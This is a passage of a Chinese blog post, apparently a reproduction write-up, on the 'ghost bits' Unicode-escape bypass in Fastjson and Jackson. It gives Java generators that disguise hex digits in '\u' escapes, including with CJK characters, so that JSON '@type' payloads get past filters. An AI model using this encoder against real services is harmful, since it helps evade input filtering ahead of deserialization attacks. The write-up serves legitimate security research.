+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;java.awt.Rectangle\&#34;}&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;java.awt.Rectangle\&#34;}&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;java.awt.Rectangle\&#34;}&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">payload</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">unicode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GhostBitsGenerator</span><span class="p">.</span><span class="na">encodeJsonToUnicode</span><span class="p">(</span><span class="n">str</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">unicode</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">ghost</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GhostBitsGenerator</span><span class="p">.</span><span class="na">replaceUnicodeHex</span><span class="p">(</span><span class="n">unicode</span><span class="p">,</span><span class="w"> </span><span class="n">hexMap</span><span class="p">,</span><span class="w"> </span><span class="n">random</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">ghost</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">ghost</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后工具类</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">ghostBits</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">GhostBitsGenerator</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">Integer</span><span class="p">,</span><span class="w"> </span><span class="n">List</span><span class="o">&lt;</span><span class="n">Character</span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="nf">getHexMap</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">Integer</span><span class="p">,</span><span class="w"> </span><span class="n">List</span><span class="o">&lt;</span><span class="n">Character</span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">hexMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TreeMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">16</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">hexMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayList</span><span class="o">&lt;&gt;</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">Character</span><span class="p">.</span><span class="na">MAX_VALUE</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">char</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="w"> </span><span class="n">i</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">hexValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Character</span><span class="p">.</span><span class="na">digit</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="w"> </span><span class="n">16</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">hexValue</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="o">-</span><span class="n">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">hexMap</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">hexValue</span><span class="p">).</span><span class="na">add</span><span class="p">(</span><span class="n">c</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">hexMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">encodeJsonToUnicode</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">StringBuilder</span><span class="w"> </span><span class="n">sb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">StringBuilder</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">str</span><span class="p">.</span><span class="na">toCharArray</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;{&#39;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;}&#39;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;&#34;&#39;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;:&#39;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;,&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">sb</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="n">c</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">sb</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="n">String</span><span class="p">.</span><span class="na">format</span><span class="p">(</span><span class="s">&#34;\\u%04x&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="n">c</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">sb</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">replaceUnicodeHex</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">unicodeJson</span><span class="p">,</span><span class="w"> </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">Integer</span><span class="p">,</span><span class="w"> </span><span class="n">List</span><span class="o">&lt;</span><span class="n">Character</span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">map</span><span class="p">,</span><span class="w"> </span><span class="n">Random</span><span class="w"> </span><span class="n">random</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">StringBuilder</span><span class="w"> </span><span class="n">sb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">StringBuilder</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">unicodeJson</span><span class="p">.</span><span class="na">length</span><span class="p">();</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">5</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">unicodeJson</span><span class="p">.</span><span class="na">length</span><span class="p">()</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">unicodeJson</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&#34;\\u&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">sb</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="s">&#34;\\u&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">4</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="kt">char</span><span class="w"> </span><span class="n">hexChar</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">unicodeJson</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">2</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">j</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="kt">int</span><span class="w"> </span><span class="n">val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Character</span><span class="p">.</span><span class="na">digit</span><span class="p">(</span><span class="n">hexChar</span><span class="p">,</span><span class="w"> </span><span class="n">16</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">List</span><span class="o">&lt;</span><span class="n">Character</span><span class="o">&gt;</span><span class="w"> </span><span class="n">alternatives</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">map</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">val</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="kt">char</span><span class="w"> </span><span class="n">replacement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">alternatives</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="na">nextInt</span><span class="p">(</span><span class="n">alternatives</span><span class="p">.</span><span class="na">size</span><span class="p">()));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">sb</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="n">replacement</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">5</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">sb</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="n">unicodeJson</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="n">i</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">sb</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515235313195.png"
+	width="1572"
+	height="294"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515235313195_hu4796235940851120525.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260515235313195_hu182182026261017244.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260515235313195"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="534"
+		data-flex-basis="1283px"
+	
+></p>
+<h2 id="jackson">jackson
+</h2><p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519200329508.png"
+	width="1570"
+	height="826"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519200329508_hu6110276447701618655.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519200329508_hu296534931340537424.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260519200329508"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="190"
+		data-flex-basis="456px"
+	
+></p>
+<p>本质是<code>\u0040</code>bypass</p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519201026521.png"
+	width="1266"
+	height="829"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519201026521_hu17907720794118062142.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519201026521_hu12810972415593292968.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260519201026521"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="152"
+		data-flex-basis="366px"
+	
+></p>
+<p>这里解析uincode字符，问题在于这个chartoHex方法</p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519201203857.png"
+	width="1009"
+	height="205"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519201203857_hu8003318613837906201.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519201203857_hu4813472928340664460.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260519201203857"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="492"
+		data-flex-basis="1181px"
+	
+></p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519201525193.png"
+	width="455"
+	height="98"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519201525193_hu14240957614484427147.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519201525193_hu5290755626247544362.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260519201525193"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="464"
+		data-flex-basis="1114px"
+	
+></p>
+<p>可以看到，如果ch是char类型，这里就是会丢失高位，只剩下低位，很标准的ghost bits</p>
+<p>跟之前的实现类似，这次我们只用中文字符集替换</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">ghostbitsBypass</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">GhostBitsGenerator</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">Character</span><span class="p">,</span><span class="w"> </span><span class="n">List</span><span class="o">&lt;</span><span class="n">Character</span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="nf">getChineseHexMap</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">Character</span><span class="p">,</span><span class="w"> </span><span class="n">List</span><span class="o">&lt;</span><span class="n">Character</span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">chineseMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">hexChars</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;0123456789abcdefABCDEF&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">hexChars</span><span class="p">.</span><span class="na">toCharArray</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">chineseMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayList</span><span class="o">&lt;&gt;</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0x4E00</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">0x9FA5</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">char</span><span class="w"> </span><span class="n">cjkChar</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="w"> </span><span class="n">i</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">char</span><span class="w"> </span><span class="n">lowByteChar</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0xFF</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">chineseMap</span><span class="p">.</span><span class="na">containsKey</span><span class="p">(</span><span class="n">lowByteChar</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">chineseMap</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">lowByteChar</span><span class="p">).</span><span class="na">add</span><span class="p">(</span><span class="n">cjkChar</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">chineseMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">encodeJsonToUnicode</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">StringBuilder</span><span class="w"> </span><span class="n">sb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">StringBuilder</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">str</span><span class="p">.</span><span class="na">toCharArray</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
